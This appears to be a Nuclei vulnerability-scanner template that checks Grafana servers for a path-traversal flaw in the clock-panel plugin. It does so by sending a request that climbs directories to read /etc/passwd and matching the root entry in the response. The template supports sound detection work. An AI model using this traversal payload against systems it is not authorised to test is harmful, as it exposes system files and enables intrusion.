id: grafana-lfi

info:
  name: Grafana clock-panel plugin LFI
  author: pdteam,dhiyaneshDk
  severity: high
  reference: https://twitter.com/pyn3rd/status/1468138032477859841
  tags: grafana,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/grafana-clock-panel/../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200